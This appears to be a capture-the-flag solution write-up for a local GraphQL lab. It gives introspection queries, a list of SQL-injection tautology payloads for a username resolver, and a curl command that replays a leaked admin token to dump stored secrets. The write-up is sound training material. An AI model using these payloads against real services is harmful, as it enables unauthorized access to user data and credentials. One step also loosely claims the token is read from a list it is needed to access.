## Solution

### FLAG 1: GraphQL Introspection

GraphQL introspection allows querying the schema itself. When you request field descriptions, the `systemFlag` field carries FLAG 1 in its `description` field:

```graphql
query {
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

Look for the `systemFlag` entry in the response — its `description` value is FLAG 1.

**Alternative: query systemFlag directly**

```graphql
query {
  systemFlag
}
```

**FLAG 1 is in the `description` field of `systemFlag` in the introspection response.**

### FLAG 2: GraphQL Injection

The `userByUsername` resolver simulates a SQL `WHERE username='<INPUT>'` clause using string concatenation. When injection causes the clause to match multiple users, the admin user is returned with a bonus `secret` field containing FLAG 2.

```graphql
query {
  userByUsername(username: "x' OR '1'='1") {
    id
    username
    email
    role
    bio
    secret
  }
}
```

**FLAG 2 is in the `secret` field of the returned admin user** — it only appears when the injection tautology succeeds (matching more than one user).

**Working injection payloads:**
- `x' OR '1'='1` (single-quote tautology)
- `x' OR 'a'='a` (alternative tautology)
- `" OR "1"="1` (double-quote via GET)
- Any payload that creates a valid boolean tautology when inserted into `WHERE username='<INPUT>'`

Note: a direct lookup like `username: "admin"` returns the admin user without the `secret` field — injection is required.

### FLAG 3: Secrets Extraction (Requires Admin Token)

The `secrets` query requires an `X-Admin-Token` header. Without it, the response omits the entry containing FLAG 3.

**Step 1: Find the admin token**

From the FLAG 2 injection result you have admin access. The SECRETS list contains an entry named `API Key` with value `sk_live_abc123def456`. This is the token you need.

**Step 2: Access secrets with the token**

```graphql
query {
  secrets {
    id
    name
    value
  }
}
```

Send this query with the HTTP header:

```
X-Admin-Token: sk_live_abc123def456
```

```bash
curl -X POST http://localhost:4012/graphql \
  -H "Content-Type: application/json" \
  -H "X-Admin-Token: sk_live_abc123def456" \
  -d '{"query": "{ secrets { id name value } }"}'
```

FLAG 3 is in the `value` field of the `Encryption Key` secret entry.

**Bonus: Batch Queries with Aliases**

```graphql
query {
  secret1: secrets {
    id
    name
    value
  }
  secret2: secrets {
    value
  }
}
```